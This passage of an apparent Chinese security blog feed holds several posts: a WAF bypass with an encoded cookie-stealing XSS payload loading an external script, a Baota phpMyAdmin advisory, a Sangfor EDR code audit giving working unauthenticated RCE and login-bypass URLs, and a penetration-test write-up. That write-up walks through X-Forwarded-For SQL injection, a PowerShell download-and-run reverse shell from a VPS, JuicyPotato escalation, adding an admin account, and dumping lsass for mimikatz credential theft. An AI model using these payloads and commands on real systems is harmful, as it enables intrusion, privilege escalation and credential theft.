src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/53.png"></p><p>bas4编码即可绕过，安全狗的xss绕过比较简单，基本是随便绕。</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/54.png"></p><p>%3Ciframe%20WIDTH%3D0%20HEIGHT%3D0%20srcdoc%3D%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%26%23x3C%3B%26%23x73%3B%26%23x43%3B%26%23x52%3B%26%23x69%3B%26%23x50%3B%26%23x74%3B%26%23x20%3B%26%23x73%3B%26%23x52%3B%26%23x43%3B%26%23x3D%3B%26%23x22%3B%26%23x68%3B%26%23x74%3B%26%23x74%3B%26%23x70%3B%26%23x73%3B%26%23x3A%3B%26%23x2F%3B%26%23x2F%3B%26%23x78%3B%26%23x73%3B%26%23x73%3B%26%23x2E%3B%26%23x70%3B%26%23x74%3B%26%23x2F%3B%26%23x63%3B%26%23x71%3B%26%23x56%3B%26%23x36%3B%26%23x22%3B%26%23x3E%3B%26%23x3C%3B%26%23x2F%3B%26%23x73%3B%26%23x43%3B%26%23x72%3B%26%23x49%3B%26%23x70%3B%26%23x54%3B%26%23x3E%3B%3E</p><p>即可轻松打到cookie，所以：仅仅靠安全狗来做防护是不够的，该过滤还是要过滤。</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/55.png"></p>]]></content>
    
    
    <summary type="html">&lt;h5 id=&quot;最新版安全狗bypass&quot;&gt;&lt;a href=&quot;#最新版安全狗bypass&quot; class=&quot;headerlink&quot; title=&quot;最新版安全狗bypass&quot;&gt;&lt;/a&gt;最新版安全狗bypass&lt;/h5&gt;</summary>
    
    
    
    <category term="waf绕过" scheme="http://www.gsheller.top/categories/waf%E7%BB%95%E8%BF%87/"/>
    
    
    <category term="bypass" scheme="http://www.gsheller.top/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>宝塔面板phpMyAdmin未授权访问</title>
    <link href="http://www.gsheller.top/2020/08/24/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BFphpMyAdmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <id>http://www.gsheller.top/2020/08/24/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BFphpMyAdmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</id>
    <published>2020-08-24T06:03:03.000Z</published>
    <updated>2021-03-04T09:30:08.077Z</updated>
    
    <content type="html"><![CDATA[<h5 id="宝塔面板phpMyAdmin未授权访问"><a href="#宝塔面板phpMyAdmin未授权访问" class="headerlink" title="宝塔面板phpMyAdmin未授权访问"></a>宝塔面板phpMyAdmin未授权访问</h5><span id="more"></span><p>漏洞描述</p><p>此版本宝塔面板在部署phpmyadmin时，直接部署在<a href="http://ip:888/pma/">http://ip:888/pma/</a> 路径下，且不需要验证用户名密码直接访问，对数据库安全构成严重威胁，攻击者甚至可以通过数据库获得服务器权限</p><p>影响版本： 宝塔面板 7.4.2 </p><p>漏洞取证：</p><p><img src="/2020/08/24/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BFphpMyAdmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/1.jpg" alt="img"></p><p>修复方案：</p><p>1、升级宝塔面板至最新版本 7.4.3 官方链接 <a href="https://www.bt.cn/bbs/thread-54644-1-1.html">https://www.bt.cn/bbs/thread-54644-1-1.html</a> </p><p>2、如不方便升级，请立即关闭888端口的公网访问，或进行访问限制</p>]]></content>
    
    
    <summary type="html">&lt;h5 id=&quot;宝塔面板phpMyAdmin未授权访问&quot;&gt;&lt;a href=&quot;#宝塔面板phpMyAdmin未授权访问&quot; class=&quot;headerlink&quot; title=&quot;宝塔面板phpMyAdmin未授权访问&quot;&gt;&lt;/a&gt;宝塔面板phpMyAdmin未授权访问&lt;/h5&gt;</summary>
    
    
    
    <category term="漏洞推送" scheme="http://www.gsheller.top/categories/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81/"/>
    
    
    <category term="漏洞推送" scheme="http://www.gsheller.top/tags/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81/"/>
    
  </entry>
  
  <entry>
    <title>深信服EDR代码审计</title>
    <link href="http://www.gsheller.top/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>http://www.gsheller.top/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2020-08-22T17:12:06.000Z</published>
    <updated>2020-11-05T07:23:57.553Z</updated>
    
    <content type="html"><![CDATA[<h5 id="深信服EDR代码审计"><a href="#深信服EDR代码审计" class="headerlink" title="深信服EDR代码审计"></a>深信服EDR代码审计</h5><span id="more"></span><h2 id="RCE1"><a href="#RCE1" class="headerlink" title="RCE1"></a>RCE1</h2><p><strong>漏洞描述：</strong></p><p>深信服终端检测平台存在远程命令执行漏洞，攻击者利用该漏洞，可在未授权的情况下向目标服务器发送恶意构造的HTTP请求，从而获得目标服务器的权限，实现远程命令执行。</p><p><strong>影响版本：</strong></p><p>漏洞影响的产品版本包括：深信服EDR 3.2.16、3.2.17、3.2.19版本，其他版本不受影响。</p><p><a href="https://ip/tool/log/c.php?strip_slashes=system&amp;host=id">https://ip/tool/log/c.php?strip_slashes=system&amp;host=id</a></p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1.jpg"></p><p>查看/tool/log/c.php</p><p>参数带入$shou_form函数</p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2.png"></p><p>进入$show_form函数</p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/3.png"></p><p>进入shou_form，直接变量覆盖参数</p><p>如果host参数存在输出$strip_slashes($host)，那直接构造为system(id)</p><p><a href="https://ip/tool/log/c.php?strip_slashes=system&amp;host=id">https://IP/tool/log/c.php?strip_slashes=system&amp;host=id</a></p><p><a href="https://ip/tool/log/c.php?strip_slashes=system&amp;path=id">https://IP/tool/log/c.php?strip_slashes=system&amp;path=id</a></p><p><a href="https://ip/tool/log/c.php?strip_slashes=system&amp;row=id">https://IP/tool/log/c.php?strip_slashes=system&amp;row=id</a></p><p><a href="https://ip/tool/log/c.php?strip_slashes=system&amp;limit=id">https://IP/tool/log/c.php?strip_slashes=system&amp;limit=id</a></p><p>都可以RCE</p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/4.jpg"></p><p>绕过cat /etc/passwd不能执行</p><p><a href="https://ip/tool/php_cli.php?strip_slashes=system&amp;code=head">https://IP/tool/php_cli.php?strip_slashes=system&amp;code=head</a> -n 100 /et?/pas???</p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/5.jpg"></p><p>绕过phpinfo();不能执行</p><p><a href="https://ip/tool/php_cli.php?strip_slashes=system&amp;code=phpinfo%0A()">https://IP/tool/php_cli.php?strip_slashes=system&amp;code=phpinfo%0a()</a>;</p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/6.jpg"></p><p><a href="https://ip/tool/php_cli.php?code=array_map(base_convert(55490343972,10,36),array(1)">https://IP/tool/php_cli.php?code=array_map(base_convert(55490343972,10,36),array(1)</a>);</p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/7.jpg"></p><h2 id="RCE2"><a href="#RCE2" class="headerlink" title="RCE2"></a>RCE2</h2><p>查看<a href="https://ip/tool/php_cli.php">https://IP/tool/php_cli.php</a></p><p>同样，开始为回调函数，</p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/8.png"></p><p>首先得到ldb_ext_root()的返回值为/ac/dc/ldb</p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/9.png"></p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/10.jpg"></p><p>如果不存在/ac/dc/ldb/php/enable_dc_tool这个文件，就终止程序，如果存在，就touch一下enable_dc_tool写入时间</p><p>ls /ac/dc/ldb/php/</p><p>没有这个文件，enable_dc_tool</p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/11.jpg"></p><p>新建移动到该目录</p><p><a href="https://ip/tool/log/c.php?strip_slashes=system&amp;host=mv%20enable_dc_tool%20/ac/dc/ldb/php/enable_dc_tool">https://IP/tool/log/c.php?strip_slashes=system&amp;host=mv%20enable_dc_tool%20/ac/dc/ldb/php/enable_dc_tool</a></p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/12.jpg"></p><p>接下来看代码，依然是变量覆盖$code</p><p>如果code参数存在输出$strip_slashes($code)，那直接构造为system(whoami)</p><p>?strip_slashes=system&amp;code=whoami</p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/13.png"></p><p><a href="https://ip/tool/php_cli.php?strip_slashes=system&amp;code=whoami">https://IP/tool/php_cli.php?strip_slashes=system&amp;code=whoami</a></p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/14.jpg"></p><p>$main函数直接获取参数变量覆盖为$code，并eval，直接构造：</p><p><a href="https://ip/tool/php_cli.php?code=system(id)">https://IP/tool/php_cli.php?code=system(id)</a>;</p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/15.jpg"></p><p>修复建议：</p><p>目前，深信服官方已发布更新版本和修复补丁，更新至3.2.21版本或升级补丁可修复该漏洞。</p><p>1、深信服已经通过在线升级功能完成漏洞补丁的在线升级修复，用户开启在线升级功能后即可升级至最新版本。</p><p>2、针对未开通在线升级功能的用户，深信服将通过客服热线主动指导用户升级，直至升级成功。同时，用户也可以通过自行下载3.2.21版本升级安装包：<a href="https://bbs.sangfor.com.cn/plugin.php?id=service:download&amp;action=view&amp;fid=100000022878128#/100000035115623/all/undefined">https://bbs.sangfor.com.cn/plugin.php?id=service:download&amp;action=view&amp;fid=100000022878128#/100000035115623/all/undefined</a></p><p>然后打开EDR管理平台后台，在系统管理–升级管理–平台和终端升级中导入该下载升级安装包，导入后，管理平台和终端将自动升级至3.2.21版本。</p><p>3、如暂时无法升级，可临时对深信服EDR系统服务配置IP访问权限策略，将其可访问的IP范围控制在安全可控的区域内。</p><p>建议使用深信服EDR系统信息系统运营者及时自查，发现存在漏洞后，按照漏洞处置建议及时进行加固处置。</p><h2 id="任意用户登陆"><a href="#任意用户登陆" class="headerlink" title="任意用户登陆"></a>任意用户登陆</h2><p>payload: <a href="https://ip/ui/login.php?user=%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E7%82%B9">https://ip/ui/login.php?user=随便写一点</a></p><p>例如:  <a href="https://ip/ui/login.php?user=ad%E2%80%A6">https://IP/ui/login.php?user=ad…</a></p><p>输入完毕以后即可直接登录平台</p><p><a href="https://ip/ui/login.php?user=admin">https://IP/ui/login.php?user=admin</a></p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/16.jpg"></p><p>/web/ui/login.php</p><p>经过调试服务器上$_SERVER[“REMOTE_ADDR”]返回127.0.0.1</p><p>浏览当前页面的用户的 IP 地址存在并且等于127.0.0.2或者127.0.0.1，条件永为真，如果存在user参数直接免密登陆。</p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/17.jpg"></p>]]></content>
    
    
    <summary type="html">&lt;h5 id=&quot;深信服EDR代码审计&quot;&gt;&lt;a href=&quot;#深信服EDR代码审计&quot; class=&quot;headerlink&quot; title=&quot;深信服EDR代码审计&quot;&gt;&lt;/a&gt;深信服EDR代码审计&lt;/h5&gt;</summary>
    
    
    
    <category term="代码审计" scheme="http://www.gsheller.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="安全研究" scheme="http://www.gsheller.top/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
  </entry>
  
  <entry>
    <title>授权测试拿下服务器</title>
    <link href="http://www.gsheller.top/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>http://www.gsheller.top/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
    <published>2020-07-10T09:54:25.000Z</published>
    <updated>2021-03-04T09:30:49.429Z</updated>
    
    <content type="html"><![CDATA[<h5 id="授权测试拿下服务器"><a href="#授权测试拿下服务器" class="headerlink" title="授权测试拿下服务器"></a>授权测试拿下服务器</h5><span id="more"></span><p>目标地址：<a href="http://www.xxx.com/">http://www.xxx.com</a></p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/1.png"></p><p>找到ip地址，进行访问，发现ip为：x.x.x.x</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/2.png"></p><p>使用ip地址进行访问</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/3.png"></p><p><strong>0x01 信息收集</strong></p><p>指纹识别结果：IIS10.0，asp.net，Windows Server</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/4.png"></p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/5.png"></p><p>爬取了一下网站，发现fackeditor，和很多接口</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/6.png"></p><p>利用御剑目录扫描，扫出来一些fackeditor的连接和upload目录</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/7.png"></p><p><strong>0x02 测试阶段</strong></p><p>尝试利用fackeditor的两处上传点进行上传，但是由于一直卡住传不上去和白名单校验遂放弃了</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/8.png"></p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/9.png"></p><p>对主站抓包测试发现，网站回返回访问者IP地址，依据经验这里经常存在XFF注入</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/10.png"></p><p>截取数据包修改X-Forwarded-For： 1.1.1.1</p><p>发现当前ip并未变化说明此处不存在XSS，</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/11.png"></p><p>习惯性的试了个单引号，数据库报错了，可能存在sql注入，并且泄露了绝对路径。</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/12.png"></p><p>构造sqlserver注入语句：</p><p>‘ and 1=db_name()–    返回数据库</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/13.png"></p><p><strong>0x03 漏洞利用</strong></p><p>既然手工这样都可以注入出来，那尝试一下使用sqlmap。</p><p>X-Forwarded-For存在报错，堆叠以及延时注入</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/14.png"></p><p>尝试–os-shell,发现可以得到os-shell</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/15.png"></p><p>尝试执行whomai，mssqlserver权限</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/16.png"></p><p>当前权限不够，我们可以利用powershell来反弹shell，然后下载提权exp进行提权，然后添加用户来登陆目标服务器。</p><p>powershell IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://www.vps.com:8000/1.ps1&#39;);Invoke-lltestTcp">http://www.vps.com:8000/1.ps1&#39;);Invoke-lltestTcp</a></p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/17.png"></p><p>shell弹回来了</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/18.png"></p><p>版本是2016</p><p>现在尝试提权，利用烂土豆直接提，windows下载文件的方式有很多，这里选择powershell的下载方式：</p><p>将烂土豆放在vps的web目录</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/19.png"></p><p>在弹回来的powershell中习惯性进入c:\windows\tasks目录，dir发现无文件，然后</p><p>输入</p><p>$client=new-object System.Net.WebClient</p><p>再输入：</p><p>$client.DownloadFile(‘<a href="http://www.vps.com:8000/p1.exe&#39;">http://www.vps.com:8000/p1.exe&#39;</a>, ‘c:\windows\tasks\p1.exe’)</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/20.png"></p><p>成功下载提权exp到目录，利用exp提权到system权限</p><p>JuicyPotato</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/21.png"></p><p>接下来新建用户，添加到管理员组</p><p>./p1.exe -p “net user admin password /add”</p><p>./p1.exe -p “net localgroup administrators admin /add”</p><p>./p1.exe -p “net user admin”发现用户添加到管理员组成功。</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/22.png"></p><p>接下来找rdp端口，判断是否开放或者对外开放。</p><p>tasklist /svc |findstr “Ter”</p><p>查找TermService对应的pid</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/23.png"></p><p>通过pid来查找rdp端口，端口为11520</p><p>netstat -ano | findstr “1628”</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/24.png"></p><p>通过nmap扫描IP地址发现11520端口对外开放，都不用做流量代理了，很舒服。</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/25.png"></p><p>现在我们通过新建在管理员组的用户登陆进去</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/26.png"></p><p>桌面上东西有点少，在这台电脑里面翻东西有点废时间，于是传了个everything上去</p><p>因为不是administrator，弹出来了uac，强迫症的我还是想dump出这个管理员的密码。</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/27.png"></p><p>因为现在已经进了3389了，就直接在目标服务器上传mimikatz，省的去webshell里面执行了。</p><p>传上去一运行就被杀了，土豆没杀却杀了mimiakatz，利用过了360和火绒的免杀mimikatz依然被杀。</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/28.png"></p><p>对比tasklist /svc发现是微软自带的Microsoft Security Essentials</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/29.png"></p><p>看来直接运行mimikatz是不行了，那就尝试导出lsass.dmp吧，导出lsass.dmp有很多种方法，免杀的有sqldumper和procdump，还可以利用powershell。</p><p>这里利用procdump导出了</p><p>procdump64.exe -accepteula -ma lsass.exe c:\lsass.dmp</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/30.png"></p><p>但是很神奇，过了一会当我准备拷贝lsass.dmp到本地的时候发现，lsass.dmp居然没了，纳尼？</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/31.png"></p><p>不过不碍事，只要我手速够快，就没有问题，纳尼？手速够快，拷贝速度不够啊，还没拷过来一丢丢呢，就直接出现了错误，果然lsass.dmp果然又没了。</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/32.png"></p><p>那怎么办，dump到其他盘符试试，还是没了</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/33.png"></p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/34.png"></p><p>那咱们利用sqldumper</p><p>通过everything搜索sqldumper，sqldumper的常见路径如下：</p><p>C:\Program Files\Microsoft SQL Server\100\Shared\SqlDumper.exe</p><p>C:\Program Files\Microsoft Analysis Services\AS OLEDB\10\SQLDumper.exe</p><p>C:\Program Files (x86)\Microsoft SQL Server\100\Shared\SqlDumper.exe</p><p>发现这个机器的sqldumper的路径和平时遇见的不太一致，先试试吧</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/35.png"></p><p>利用lsass.exe发现PID</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/36.png"></p><p>利用sqldumper失败了</p><p>“C:\Program Files (x86)\Microsoft SQL Server\130\Shared\SqlDumper.exe” 1316 0 0x01100</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/37.png"></p><p>换一个路径，dump下来了SQLDmpr0001.mdmp</p><p>“C:\Program Files\Microsoft SQL Server\130\Shared\SqlDumper.exe” 1316 0 0x01100</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/38.png"></p><p>管理员打开mimikatz，抱错了，有点小难受，具体原因还不清楚。</p><p>sekurlsa::minidump SQLDmpr0001.mdmp”</p><p>sekurlsa::logonPasswords full</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/39.png"></p><p>那最后试试powershell吧</p><p>powershell -c “rundll32 C:\windows\system32\comsvcs.dll, MiniDump 1316 C:\lsass.dmp full” </p><p>成功dump</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/40.png"></p><p>刷新了半天发现lsass.dmp还在，赶紧拷贝到本地利用mimikatz解密，ok感谢电脑，拷贝过来了</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/41.png"></p><p>mimikatz解密一下</p><p>sekurlsa::minidump lsass.dmp</p><p>sekurlsa::logonPasswords full</p><p>Password那里是空的，在win10或者2012R2以上，默认在缓存中禁止保存明文密码，可以修改注册表并且管理员需要重新登陆才能成功抓取明文，不过可以解密一下NTLM</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/42.png"></p><p>nice，果然是收费的，</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/43.png"></p><p>找小姐姐花了一块钱成功解密，感谢小姐姐，如果每一个做安全的都像我一样抠门，这些网站估计要倒闭吧</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/44.png"></p><p>我们利用administrator登陆一下</p><p>舒服了，桌面上多了很多东西，慢慢翻吧，</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/45.png"></p><p>打开sqlserver management，windows身份认证直接登陆上去：</p><p>账号密码邮箱手机号找到了，再继续多翻点配置文件啥的写报告就不多赘述了。</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/46.png"></p><p>不过这个站没有内网，后来也就没有进行下去了。因为是授权的，痕迹也不用清了，接下来就是交报告了。</p><p><img src="/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/47.png"></p>]]></content>
    
    
    <summary type="html">&lt;h5 id=&quot;授权测试拿下服务器&quot;&gt;&lt;a href=&quot;#授权测试拿下服务器&quot; class=&quot;headerlink&quot; title=&quot;授权测试拿下服务器&quot;&gt;&lt;/a&gt;授权测试拿下服务器&lt;/h5&gt;</summary>
    
    
    
    <category term="实战渗透" scheme="http://www.gsheller.top/categories/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F/"/>
    
    
